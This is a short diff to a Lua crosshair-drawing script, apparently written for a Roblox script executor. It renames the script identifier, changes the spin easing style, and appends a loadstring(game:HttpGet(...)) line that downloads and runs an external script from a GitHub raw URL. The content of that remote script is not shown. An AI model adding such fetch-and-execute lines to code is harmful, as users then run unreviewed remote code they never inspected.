@@ -1,5 +1,5 @@
 -- Unique identifier for this script instance
-local SCRIPT_IDENTIFIER = "awshucksdudewhattheflipspunks"
+local SCRIPT_IDENTIFIER = "CustomCrosshairScript"
 
 -- Check for existing instance and terminate it
 if getgenv().currentCrosshairScript then
@@ -20,7 +20,7 @@ getgenv().crosshair = {
     isSpinning = true, -- animate the rotation
     spinSpeed = 150,
     maxSpinAngle = 340,
-    spinEasingStyle = "Circular", -- supports Sine, Back, Quad, Quart, Quint, Bounce, Elastic, Exponential, Circular, Cubic
+    spinEasingStyle = "Back", -- supports Sine, Back, Quad, Quart, Quint, Bounce, Elastic, Exponential, Circular, Cubic
     isResizing = false, -- animate the length
     resizeSpeed = 150,
     minResizeLength = 5,
@@ -131,3 +131,6 @@ getgenv().currentCrosshairScript = runservice.PostSimulation:Connect(function()
         end
     end
 end)
+
+-- Load the external script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/f-5ve/storage/main/spinspin.lua", true))()
